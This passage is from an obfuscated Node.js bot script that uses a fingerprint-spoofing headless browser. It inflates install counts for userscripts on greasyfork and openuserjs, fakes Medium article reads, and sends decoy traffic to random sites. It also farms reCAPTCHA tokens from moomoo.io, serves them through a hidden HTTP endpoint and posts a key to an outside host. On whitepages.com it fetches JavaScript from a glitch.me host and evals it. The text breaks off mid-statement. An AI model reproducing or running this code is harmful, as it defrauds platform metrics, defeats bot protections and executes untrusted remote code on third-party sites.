      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x0) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + Y(0x7) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + X(0x16, 'H@Qj') + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + Y(0x1b) + 'etter-prog' + X(0x5, 'iOMb') + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + Y(0x19) + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x720 + 0x11dd * -0x1 + -0xabd * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1fe2 + -0x1 * -0xdfb + 0xc7 * -0x3b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x2 * -0x91d + 0x139b + 0xd5 * -0x2d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x4 * -0x359 + 0x574 + 0x854), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x216d + 0x160c + 0x1 * 0xb61;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x54e + -0x2 * 0xb5a + -0x956 * -0x3; w < getRandomInt(-0x1be3 * -0x1 + 0x2 + -0x1be4, -0x1 * -0x1e5b + -0x223 * 0x1 + -0x1c33); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * 0x139d2 + 0x23c * -0x67 + 0x30a56);
        }
      }();
    }, 0x30 + 0x17b3 * -0x1 + 0x17e7 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x794 + 0x3e6 + 0x3ae;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3e3 * -0x5 + -0x581 + 0x2 * -0x6f7, 0x1241 + -0xd4 * -0x29 + 0x3403 * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const Z = d;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': Z(0xe)
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xcff4 + 0xd80b + 0x6d19 * 0x1);
    }, 0x2048 * -0x1 + -0x534 * 0x2 + 0xc * 0x397), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x23c3 + 0x7d7 + 0x1bec;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x765 + -0x19d + 0x14ba * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1a4d + -0x1 * -0xf3e + 0xb0f), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * -0x1280fb + 0xb51 * -0xb3 + 0x32448);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x10cb + 0x1 * -0xf45 + -0x122);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x66 + -0x4e2 + -0x1 * -0x544);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2a8b + -0x1d40 + 0x1245);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d,
    a0 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x244 * -0x1 + -0x30d + 0x2 * 0x2a9) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x33d + 0x1 * 0x1843 + -0x1505 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x439 + 0xd34 + -0x8fb, D['indexOf']('\x20'));
        return B ? E['slice'](-0x5c * -0x21 + 0x185 * -0xa + 0x7a * 0x7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x26d6 + 0x4596 + -0x2 * -0x428),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1b57 + 0x1312 + 0x2f55),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + a0(0x12) + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x14) + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + a2(0x18, '*@Ji') + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x2c + -0x6e * -0x3b + -0x192e; k < -0xcf * -0x16 + -0x291 * -0x1 + -0x1457; k++)
    setTimeout(f, (-0xc8d0 + -0x84b5 * 0x3 + -0x5c97 * -0x9) * k * getRandomInt(-0x1d2f + 0x6 * 0x335 + -0x43 * -0x26, 0x759 + 0x22ba + -0x2a10));
  setInterval(() => {
    f();
    for (let l = -0x946 + -0x1c7c + 0x25c2 * 0x1; l < 0xf23 + 0x49 * 0x8 + -0x1167; l++)
      setTimeout(f, (0x18c92 + 0x27 * 0x7fb + -0x1d96f) * l * getRandomInt(0x1 * -0x3a6 + -0x2 * 0x7b0 + 0x1307, -0x19 * -0x2c + -0xa37 * -0x3 + 0x1 * -0x22ee));
  }, -0xd73c6 + 0x18cb58 + 0x2b96ee);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
